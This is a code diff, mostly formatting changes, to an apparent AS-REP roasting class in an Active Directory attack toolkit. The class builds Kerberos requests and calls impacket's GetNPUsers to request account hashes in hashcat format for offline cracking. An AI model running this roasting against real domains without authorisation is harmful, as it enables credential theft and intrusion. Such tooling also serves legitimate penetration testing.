@@ -78,9 +78,9 @@ class ASREPRoast:
         ldap_conn.search(
             searchFilter=self.CHECK_FILTER,
             attributes=["sAMAccountName"],
-            perRecordCallback=lambda x: entries.append(x)
-            if isinstance(x, ldapasn1.SearchResultEntry)
-            else None,
+            perRecordCallback=lambda x: (
+                entries.append(x) if isinstance(x, ldapasn1.SearchResultEntry) else None
+            ),
         )
         ldap_conn.close()
 
@@ -123,7 +123,9 @@ class ASREPRoast:
         except ImportError:
             pass
 
-        client_name = Principal(target_user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        client_name = Principal(
+            target_user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
+        )
         as_req = krb5_asn1.AS_REQ()
 
         # Build the AS-REQ body
@@ -143,21 +145,25 @@ class ASREPRoast:
         if cmd is None:
             # Try python -m
             cmd_parts = [
-                "python", "-m", "impacket.examples.GetNPUsers",
+                "python",
+                "-m",
+                "impacket.examples.GetNPUsers",
                 f"{self.domain}/{self.username}:{self.password}",
-                "-dc-ip", self.dc_ip,
+                "-dc-ip",
+                self.dc_ip,
                 "-request",
-                "-usersfile", "-",
-                "-format", "hashcat",
+                "-format",
+                "hashcat",
             ]
         else:
             cmd_parts = [
                 cmd,
                 f"{self.domain}/{self.username}:{self.password}",
-                "-dc-ip", self.dc_ip,
+                "-dc-ip",
+                self.dc_ip,
                 "-request",
-                "-usersfile", "-",
-                "-format", "hashcat",
+                "-format",
+                "hashcat",
             ]
 
         proc = subprocess.run(
